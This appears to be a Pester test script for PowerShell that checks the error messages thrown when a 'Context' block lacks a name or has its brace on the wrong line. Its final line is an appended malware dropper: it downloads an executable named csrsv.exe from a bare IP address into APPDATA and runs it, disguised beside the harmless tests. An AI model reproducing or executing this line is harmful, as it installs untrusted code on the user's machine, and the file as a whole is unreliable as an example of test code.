Set-StrictMode -Version Latest

Describe 'Testing Context' {
    It "Context throws a missing name error" {
        { Context {
                it "runs a test" {

                }
            }
        }| should -Throw  'Test fixture name has multiple lines and no test fixture is provided. (Have you provided a name for the test group?)'
    }

    It "Has a name that looks like a script block" {
        { Context "context"
            {
                it "runs a test" {

                }
            }
        }| should -Throw  'No test fixture is provided. (Have you put the open curly brace on the next line?)'
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

